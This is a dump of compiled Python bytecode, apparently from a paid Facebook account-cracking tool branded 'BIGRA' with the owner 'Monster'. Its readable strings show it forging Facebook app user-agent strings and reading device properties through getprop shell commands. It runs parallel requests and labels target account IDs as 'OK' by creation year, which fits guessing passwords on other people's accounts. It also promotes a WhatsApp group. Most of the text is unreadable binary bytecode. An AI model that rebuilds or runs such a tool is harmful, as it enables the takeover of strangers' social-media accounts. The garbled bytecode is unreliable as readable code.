\xab\x02\x00\x00\x00\x00\x00\x00Z8\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d&d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z9\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\'d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z:d(Z;\t\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00d\x00\x19\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z=\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d,d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z>\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d-d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z?e9Z@e8ZA\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d.d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*d/\xab\x02\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00ZBd0\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d1d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00z\x00\x00\x00d2z\x00\x00\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d3d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00z\x00\x00\x00ZC\t\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00Z=d\x00ZDe=D\x00]\x07\x00\x00Z,eDd\x0fz\r\x00\x00ZD\x8c\t\x04\x00d4ZEeEd5k(\x00\x00rO\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00d\x00\x19\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4n`eEd6k(\x00\x00rP\t\x00\x02\x00e\x0ejj\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d)d"\xac#\xab\x02\x00\x00\x00\x00\x00\x00jm\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d$\xab\x01\x00\x00\x00\x00\x00\x00jy\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d*\xab\x01\x00\x00\x00\x00\x00\x00d\x0f\x19\x00\x00\x00jo\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d%d \xab\x02\x00\x00\x00\x00\x00\x00Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4n\x0bd7Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4e8e9e:e;e>e?e9eAeBeCd8\x9c\nZGd9\x84\x00ZHd:ZId;\x84\x00ZJd\x00a\x17g\x00a\x15g\x00a\x16g\x00ZKg\x00ZLd<\x84\x00ZMd=\x84\x00ZNd>\x84\x00ZOd?\x84\x00ZPd@\x84\x00ZOdA\x84\x00ZQ\x02\x00eQ\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00y\x01#\x00e\x13$\x00r%\x01\x00\x02\x00e\x06d\x06\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x0e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x14\xab\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00\x90\x04\x8clw\x00x\x03Y\x00w\x01#\x00\x01\x00d+Z=Y\x00\x90\x02\x8c~x\x03Y\x00w\x01#\x00eF$\x00r\x15Z(d+Z=th\x00\x00\x00\x00\x00\x00\x00\x00e=z\r\x00\x00a4Y\x00d\x01Z([(\x8c\x85d\x01Z([(w\x01w\x00x\x03Y\x00w\x01#\x00\x01\x00d+Z=Y\x00\x8c\x93x\x03Y\x00w\x01)B\xe9\x00\x00\x00\x00Nz#\x1b[1;37\x1b[1m Join our WhatsApp group z9xdg-open https://chat.whatsapp.com/FeUqeXZuiKu3CVaIP9dp0s)\x01\xda\x01*)\x01\xda\x12ThreadPoolExecutorz$ \n\n Module Not installed Correctly! \xe9\x05\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\x00\x00\xf3\xb4\x01\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x01\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00}\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x02\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00}\x01t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00g\x00d\x03\xa2\x01\xab\x01\x00\x00\x00\x00\x00\x00}\x02d\x04t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\x07z\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x08d\t\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\nz\x00\x00\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bd\x0c\xab\x02\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00z\x00\x00\x00d\rz\x00\x00\x00}\x03d\x0e}\x04|\x03|\x04z\x00\x00\x00}\x05|\x05S\x00)\x0fN)\t\xda\x05en_US\xda\x05en_GB\xda\x05en_PK\xda\x05ru_RU\xda\x05de_DE\xda\x05th_TH\xda\x05en_BD\xda\x05en_IN\xda\x05en_AF)\x03\xfa\x13com.facebook.katana\xfa\x11com.facebook.orca\xfa\x12com.facebook.mlite)\x08z\x07o2 - dez\x0cVerizon - usz\tMY CELCOMz\rVodafone - uk\xda\x04null\xda\x04DTACz\nIND airtelz\rNepal Telecom\xfa\x10[FBAN/FB4A;FBAV/\xe9\x0b\x00\x00\x00\xe9M\x00\x00\x00\xfa\x05.0.0.\xe9\t\x00\x00\x00\xe91\x00\x00\x00\xfa\x06;FBBV/\xe9G\xf4\x10\x00i\xf1\xadv\x00a(\x01\x00\x00;[Davik/2.1.0 (Linux; U; Android 12; Infinix X6817 Build/SP1A.210812.016) [FBAN/MessengerLite;FBAV/308.0.0.3.90;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/521471303;FBCR/Jazz;FBMF/INFINIX;FBBD/Infinix;FBDV/Infinix X6817;FBSV/12;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]a\x9d\x02\x00\x00FBAN/FB4A;FBAV/340.0.0.31.63;FBBV/1397400;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH7991;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]FBAN/FB4A;FBAV/356.0.0.31.63;FBBV/1816189;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH1615;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]FBAN/FB4A;FBAV/479.0.0.31.63;FBBV/5863778;FBDM/{density=2.5,width=720,height=1456};FBLC/en_US;FBRV/444411021;FBCR/I TIM;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/CPH7577;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;])\x05\xda\x06random\xda\x06choice\xda\x03str\xda\x07randint\xda\trandrange)\x06\xda\x02en\xda\x02kt\xda\x04fbcr\xda\x01s\xda\x01e\xda\x02uas\x06\x00\x00\x00      \xda\x01 \xda\x05BIGR9r)\x00\x00\x00\x14\x00\x00\x00s\xe9\x00\x00\x00\x80\x00\xdc\t\x0f\x8f\x1d\x89\x1d\xd2\x17`\xd3\ta\x80B\xdc\t\x0f\x8f\x1d\x89\x1d\xd2\x17W\xd3\tX\x80B\xdc\x0b\x11\x8f=\x89=\xd2\x19{\xd3\x0b|\x80D\xd8\x08\x1a\x9c3\x9cv\x9f~\x99~\xa8b\xb0\x12\xd3\x1f4\xd3\x1b5\xd1\x085\xb0g\xd1\x08=\xbcc\xc4&\xd7BR\xd1BR\xd0ST\xd0UW\xd3BX\xd3>Y\xd1\x08Y\xd4Z]\xd4^d\xd7^l\xd1^l\xd0mo\xd0pr\xd3^s\xd3Zt\xd1\x08t\xd0v~\xd1\x08~\xf4\x00\x00@\x02C\x02\xf4\x00\x00D\x02J\x02\xf7\x00\x00D\x02R\x02\xf1\x00\x00D\x02R\x02\xf0\x00\x00S\x02Z\x02\xf0\x00\x00[\x02b\x02\xf3\x00\x00D\x02c\x02\xf3\x00\x00@\x02d\x02\xf1\x00\x00\td\x02\xf0\x00\x00e\x02O\x07\xf1\x00\x00\tO\x07\x80A\xf0\x02\x00\tn\n\x80A\xd8\t\n\x88Q\x89\x15\x80B\xd8\x0b\r\x80I\xf3\x00\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xc8\x00\x00\x00\x97\x00d\x01d\x02g\x02}\x00d\x03t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04d\x05\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\x06t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x07d\x08\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\tt\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\nd\x0b\xab\x02\x00\x00\x00\x00\x00\x00\x9b\x00d\x0ct\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00\x9b\x00\x9d\x08}\x01|\x01S\x00)\rNz\xef[FBAN/FB4A;FBAV/455.0.0.0.35;[FBAN/FB4A;FBAVFBBV/450004028;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]z\xef[FBAN/FB4A;FBAV/463.0.0.0.50;[FBAN/FB4A;FBAVFBBV/451606073;FBDM/{density=6.6,width=1080,height=2340};FBLC/en_US;FBRV/213152948;FBCR/AT&amp-T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A356U;FBSV/14;FBOP/19;FBCA/arm64-v8a:;]r\x15\x00\x00\x00r\x16\x00\x00\x00\xe9c\x00\x00\x00r\x18\x00\x00\x00iW\x04\x00\x00i\x0f\'\x00\x00r\x1b\x00\x00\x00r\x1c\x00\x00\x00i\x7f\x96\x98\x00\xda\x01;)\x03r\x1d\x00\x00\x00r \x00\x00\x00r\x1e\x00\x00\x00)\x02\xda\r____sexua____\xda\n____ua____s\x02\x00\x00\x00  r(\x00\x00\x00\xda\x11____useragent____r0\x00\x00\x00\x1d\x00\x00\x00s\x91\x00\x00\x00\x80\x00\xf0\x04\x00\x02s\x03\xf0\x02\x00\x02s\x03\xf0\x05\x02\x12t\x03\x80\x1d\xf0\x06\x00\x11!\xa4\x16\xa7\x1e\xa1\x1e\xb0\x02\xb02\xd3!6\xd0 7\xb0u\xbcV\xbf^\xb9^\xc8D\xd0QU\xd3=V\xd0<W\xd0W]\xd4^d\xd7^l\xd1^l\xd0mt\xd0u|\xd3^}\xd0]~\xd0~\x7f\xf4\x00\x00A\x02G\x02\xf7\x00\x00A\x02N\x02\xf1\x00\x00A\x02N\x02\xf0\x00\x00O\x02\\\x02\xf3\x00\x00A\x02]\x02\xf0\x00\x00@\x02^\x02\xf0\x00\x00\x0f_\x02\x80\x1a\xd8\x08\x12\xd0\x01\x12r*\x00\x00\x00i\xe8\x03\x00\x00z\x1cMozilla/5.0 (Linux; Android;)\x07\xda\x016\xda\x017\xda\x018\xda\x019\xda\x0210\xda\x0211\xda\x0212z\x1fen-us; 12; Infinix X6817 Build/)\x1a\xda\x01A\xda\x01B\xda\x01C\xda\x01D\xda\x01E\xda\x01F\xda\x01G\xda\x01H\xda\x01I\xda\x01J\xda\x01K\xda\x01L\xda\x01M\xda\x01N\xda\x01O\xda\x01P\xda\x01Q\xda\x01R\xda\x01S\xda\x01T\xda\x01U\xda\x01V\xda\x01W\xda\x01X\xda\x01Y\xda\x01Z\xe9\x01\x00\x00\x00\xe9\xe7\x03\x00\x00zFAppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.5462.85\xe9F\x00\x00\x00\xe9^\x00\x00\x00\xda\x010iP\x14\x00\x00i\x0c\x17\x00\x00\xe9\x1e\x00\x00\x00i"\x01\x00\x00z\x14Mobile Safari/537.36r(\x00\x00\x00z\x02; z\x02) \xda\x01.)\x05z\x17com.facebook.adsmanagerz\x11com.facebook.liter\x11\x00\x00\x00r\x10\x00\x00\x00r\x12\x00\x00\x00)\x95\xfa\x0fSM-G920F|NRD90Mz\x0eSM-T535|LRX22G\xfa\x0eSM-T231|KOT49H\xfa\x0fSM-J320F|LMY47V\xfa\x0fGT-I9190|KOT49H\xfa\x0fGT-N7100|KOT49H\xfa\x0eSM-T561|KTU84Pr]\x00\x00\x00\xfa\x0fGT-I9500|LRX22Cr[\x00\x00\x00\xfa\x0fSM-G930F|NRD90Mr[\x00\x00\x00\xfa\x10SM-J510FN|NMF26Xz\x0fGT-P5100|IML74Kr[\x00\x00\x00\xfa\x0fGT-N8000|JZO54K\xfa\x0eSM-T531|LRX22Gz\x0fSPH-L720|KOT49Hz\x0eGT-I9500|JDQ39\xfa\x0fSM-G935F|NRD90Mr^\x00\x00\x00z\x0eSM-T531|KOT49H\xfa\x10SM-J320FN|LMY47V\xfa\x0fSM-A500F|MMB29M\xfa\x10SM-A500FU|MMB29Mrf\x00\x00\x00\xfa\x0eSM-T311|KOT49Hrc\x00\x00\x00r[\x00\x00\x00re\x00\x00\x00r[\x00\x00\x00\xfa\x0fGT-P5210|KOT49Hz\x0eSM-T230|KOT49H\xfa\x0fGT-I9192|KOT49Hz\x0cSM-T235|KOT4r]\x00\x00\x00\xfa\x0fSM-A500F|LRX22Grf\x00\x00\x00r]\x00\x00\x00z\x0fSM-G920F|MMB29Kra\x00\x00\x00rb\x00\x00\x00re\x00\x00\x00re\x00\x00\x00z\x0fSM-A500H|MMB29M\xfa\x0fGT-I9300|JSS15Jr_\x00\x00\x00z\rSM-J320F|LMY4ra\x00\x00\x00rf\x00\x00\x00\xfa\x0fGT-N8000|KOT49Hr^\x00\x00\x00z\x0fSM-G900F|KOT49Hz\x0fGT-S7390|JZO54Kr[\x00\x00\x00z\x0fGT-P5100|JZO54Krg\x00\x00\x00r`\x00\x00\x00ra\x00\x00\x00r^\x00\x00\x00rm\x00\x00\x00rc\x00\x00\x00z\x10SM-J510FN|MMB29Mra\x00\x00\x00r[\x00\x00\x00z\x0eGT-P5110|JDQ39\xfa\x10GT-I9301I|KOT49Hrk\x00\x00\x00r`\x00\x00\x00z\x0cSM-T311|KOT4\xfa\x0fGT-P5200|KOT49Hrn\x00\x00\x00z\x0fSM-J320M|LMY47Vrc\x00\x00\x00\xfa\x0eSM-T820|NRD90Mrj\x00\x00\x00z\x0fSM-G935F|MMB29Kz\x10SM-J701F|NRD90M;z\x0eGT-I9301I|KOT4re\x00\x00\x00z\rSM-T111|JDQ39rf\x00\x00\x00z\x0eSM-J510FN|NMF2z\x0eSM-T705|LRX22GrY\x00\x00\x00\xfa\x0fGT-N5100|JZO54K\xfa\x10GT-I9300I|KTU84Prr\x00\x00\x00rm\x00\x00\x00rm\x00\x00\x00rf\x00\x00\x00r\\\x00\x00\x00ra\x00\x00\x00r[\x00\x00\x00z\x0eGT-P5100|JDQ39rr\x00\x00\x00rq\x00\x00\x00rm\x00\x00\x00r_\x00\x00\x00re\x00\x00\x00rf\x00\x00\x00rb\x00\x00\x00\xfa\x0eSM-T805|LRX22GrZ\x00\x00\x00rq\x00\x00\x00z\x0fSM-J320H|LMY47VrZ\x00\x00\x00r`\x00\x00\x00rd\x00\x00\x00z\x0eSM-T310|KOT49Hrm\x00\x00\x00rr\x00\x00\x00rY\x00\x00\x00ra\x00\x00\x00z\x0fSM-T705|LRX22G;z\x0fGT-P3110|JZO54Krj\x00\x00\x00r[\x00\x00\x00rY\x00\x00\x00z\x0fGT-I9300|IMM76Dz\x0fSM-G950F|NRD90Mr[\x00\x00\x00\xfa\x11SM-J510FN|NMF26X;z\x0fSM-J701F|NRD90Mrk\x00\x00\x00rZ\x00\x00\x00rh\x00\x00\x00re\x00\x00\x00ri\x00\x00\x00rs\x00\x00\x00r_\x00\x00\x00ro\x00\x00\x00rn\x00\x00\x00rl\x00\x00\x00r]\x00\x00\x00rc\x00\x00\x00rp\x00\x00\x00z\rSM-T315|JDQ39r[\x00\x00\x00r\\\x00\x00\x00z\x0eGT-P5220|JDQ39z\x0eSM-T525|KOT49Hz\x0eSM-T555|LRX22Gr\\\x00\x00\x00rt\x00\x00\x00rf\x00\x00\x00rj\x00\x00\x00z\x0cGT-P5100|JDQrh\x00\x00\x00\xda\x00z getprop ro.build.version.releaseT)\x01\xda\x05shellz\x05utf-8\xda\x01\nz\x18getprop ro.product.modelz\x13getprop ro.build.idr\x07\x00\x00\x00z\x1agetprop gsm.operator.alpha\xda\x01,\xda\x06Roshanz\x1fgetprop ro.product.manufacturerz\x18getprop ro.product.brandz\x1egetprop ro.product.cpu.abilist\xda\x01:z\x15{density=2.25,height=z\'getprop ro.hwui.text_large_cache_heightz\x07,width=z&getprop ro.hwui.text_large_cache_width)\x02\xda\x011\xda\x012r{\x00\x00\x00r|\x00\x00\x00\xda\x06Roahan)\n\xda\x0fandroid_version\xda\x05model\xda\x05build\xda\x04fblc\xda\x04fbmf\xda\x04fbbd\xda\x04fbdv\xda\x04fbsv\xda\x04fbca\xda\x04fbdmc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3L\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x00)\x02N\xda\x05clear)\x04\xda\x02os\xda\x06system\xda\x05print\xda\x04logo\xa9\x00r*\x00\x00\x00r(\x00\x00\x00r\x89\x00\x00\x00r\x89\x00\x00\x00g\x00\x00\x00s\x15\x00\x00\x00\x80\x00\xdc\x04\x06\x87I\x81I\x88g\xd4\x04\x16\xdc\x04\t\x8c$\x85Kr*\x00\x00\x00a\xd3\x01\x00\x00\x1b[1;97m\nd8888b. d888888b  d888b  d8888b.  .d8b.  \n88  `8D   `88\'   88\' Y8b 88  `8D d8\' `8b \n88oooY\'    88    88      88oobY\' 88ooo88 \n88~~~b.    88    88  ooo 88`8b   88~~~88 \n88   8D   .88.   88. ~8~ 88 `88. 88   88 \nY8888P\' Y888888P  Y888P  88   YD YP   YP  \n\x1b[1;37m--------------------------------------------------\n Owner      :  Monster\n Facebook   :  Bigra Mahar \n Version    :  15.3\n Status     :  Paid\n\x1b[1;37m--------------------------------------------------c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3\x1a\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xab\x01\x00\x00\x00\x00\x00\x00\x01\x00y\x00)\x02Nz@\x1b[1;37m--------------------------------------------------\x1b[1;33m)\x01r\x8c\x00\x00\x00r\x8e\x00\x00\x00r*\x00\x00\x00r(\x00\x00\x00\xda\x04liner\x90\x00\x00\x00y\x00\x00\x00s\x0b\x00\x00\x00\x80\x00\xdc\x04\t\xd0\x0cR\xd5\x04Tr*\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3:\x02\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d\x01k(\x00\x00r\xd5|\x00d\x00d\x02\x1a\x00d\x03v\x00r\x04d\x04}\x01|\x01S\x00|\x00d\x00d\x05\x1a\x00d\x06v\x00r\x04d\x07}\x01|\x01S\x00|\x00d\x00d\x08\x1a\x00d\tv\x00r\x04d\n}\x01|\x01S\x00|\x00d\x00d\x0b\x1a\x00d\x0cv\x00r\x04d\n}\x01|\x01S\x00|\x00d\x00d\x0b\x1a\x00d\rv\x00r\x04d\x0e}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x10v\x00r\x04d\x11}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x12v\x00r\x04d\x13}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x14v\x00r\x04d\x15}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x16v\x00r\x04d\x17}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x18v\x00r\x04d\x17}\x01|\x01S\x00|\x00d\x00d\x0f\x1a\x00d\x19v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1cv\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1dv\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1ev\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d\x1fv\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d!v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d"v\x00r\x04d\x1a}\x01|\x01S\x00|\x00d\x00d\x1b\x1a\x00d#v\x00r\x04d$}\x01|\x01S\x00d%}\x01|\x01S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d&v\x00r\x04d\'}\x01|\x01S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d\x08k(\x00\x00r\x04d(}\x01|\x01S\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00|\x00\xab\x01\x00\x00\x00\x00\x00\x00d\x0bk(\x00\x00r\x04d)}\x01|\x01S\x00d%}\x01|\x01S\x00)*N\xe9\x0f\x00\x00\x00\xe9\n\x00\x00\x00)\x01\xda\n1000000000z\x0e (*-*) 2009 OKr\x19\x00\x00\x00)\x01\xda\t100000000z\x11 ACCOUNT  2009 OK\xe9\x08\x00\x00\x00)\x01\xda\x0810000000z\x10 ACCOUNT 2009 OK\xe9\x07\x00\x00\x00)\x06\xda\x071000000\xda\x071000001\xda\x071000002\xda\x071000003\xda\x071000004\xda\x071000005)\x04\xda\x071000006\xda\x071000007\xda\x071000008\xda\x071000009z\x10 ACCOUNT 2010 